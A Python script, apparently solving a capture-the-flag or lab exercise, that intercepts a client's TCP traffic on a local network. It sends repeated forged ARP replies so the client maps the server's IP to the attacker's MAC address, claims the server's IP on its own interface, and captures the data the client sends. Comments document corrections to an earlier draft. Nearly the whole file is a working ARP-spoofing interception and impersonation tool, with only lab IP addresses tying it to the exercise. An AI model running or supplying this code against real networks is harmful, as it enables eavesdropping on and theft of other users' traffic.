#!/usr/bin/env python3
"""
interceptor.py — TCP interception via ARP poisoning + server impersonation (doc §3-§4, option A).

The client (10.0.0.2) connects to 10.0.0.3:31337 and sends the flag (run:19-20). We poison the
client's ARP cache so 10.0.0.3 resolves to OUR MAC, claim 10.0.0.3 on our interface, and run a
normal TCP server — the kernel completes the handshake and recv() hands us the flag.

Run as root INSIDE the ./run shell (user_host is privileged, run:39):  python interceptor.py

NOTE: wrong lines from the first draft are kept commented with # WRONG / # WHY so the fix is
self-documenting.
"""

import os
import socket
import threading
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp

# conf.iface can be a NetworkInterface object; os.system("ip addr ...") needs a plain name string.
# WRONG: IFACE = conf.iface
# WHY:   passed straight into an `ip addr` shell command later -> may stringify oddly; pin the name.
IFACE = str(conf.iface)
PORT = 31337
CLIENT = '10.0.0.2'
SERVER = '10.0.0.3'
MAC_ADDR = get_if_hwaddr(IFACE)          # our real MAC — what we want the client to cache for SERVER

# WRONG: DST_MAC = 'ff:ff:ff:ff:ff:ff'
# WHY:   this broadcast value was used as the ARP-layer hwdst while our OWN mac went into Ether(dst),
#        which is backwards (see arp_poison below). The Ethernet destination is what needs to be
#        broadcast so the frame actually reaches the client; kept here only as a label.
BROADCAST = 'ff:ff:ff:ff:ff:ff'


def arp_poison() -> None:
    # WRONG: poision = Ether(dst = MAC_ADDR) / ARP(op=2, psrc=SERVER, pdst=CLIENT, hwdst=DST_MAC)
    # WHY:   Ether(dst=MAC_ADDR) addresses the frame to OURSELVES, so the client never receives the
    #        poison. The Ethernet dst must be the client (broadcast is fine); and we should assert
    #        "SERVER is-at MY_MAC" via hwsrc=MAC_ADDR (scapy defaults hwsrc to our iface MAC, but be
    #        explicit). hwdst is just the target's hwaddr and can stay broadcast.
    poison = Ether(dst=BROADCAST) / ARP(
        op=2,                            # ARP reply ("is-at")
        psrc=SERVER,                     # claim: 10.0.0.3 ...
        hwsrc=MAC_ADDR,                  # ... is at our MAC
        pdst=CLIENT,
        hwdst=BROADCAST,
    )
    print(f"[*] poisoning {CLIENT}: {SERVER} is-at {MAC_ADDR} via {IFACE}")

    while True:
        sendp(poison, iface=IFACE, verbose=False)
        time.sleep(1)                    # keep re-asserting; the real server also answers for itself


def intercept() -> None:
    # The reported crash: bind() needs 10.0.0.3 to be a LOCAL address, but we are 10.0.0.1.
    # WRONG: (no IP claimed) ... sock.bind((SERVER, PORT))  -> OSError [Errno 99] Cannot assign
    #        requested address. Binding 0.0.0.0 would NOT help either: the client's SYN has dst IP
    #        10.0.0.3, which the kernel won't deliver locally unless that IP is assigned to us.
    # FIX:   claim 10.0.0.3 on our interface first, release it on exit.
    os.system(f"ip addr add {SERVER}/24 dev {IFACE}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((SERVER, PORT))        # now valid: 10.0.0.3 is a local alias
        sock.listen()

        # WRONG: this status print lived in `finally`, so it only showed AFTER the loop ended.
        print(f"[*] impersonating {SERVER}:{PORT} on {IFACE} — waiting for the client...")

        while True:
            conn, addr = sock.accept()
            data = conn.recv(1024)
            conn.close()

            if data.strip():
                print(f"[+] FLAG from {addr[0]}:{addr[1]}: {data.decode(errors='replace')}")
                break
    finally:
        # WRONG: print(f"[*] Intercepting traffic on {IFACE} from {CLIENT} to {SERVER}")
        # WHY:   `finally` ran the status message instead of cleaning up. We must remove the alias,
        #        or a stale 10.0.0.3 lingers and the next run's `ip addr add` / bind misbehaves.
        os.system(f"ip addr del {SERVER}/24 dev {IFACE}")


if __name__ == "__main__":
    threading.Thread(target=arp_poison, daemon=True).start()
    intercept()
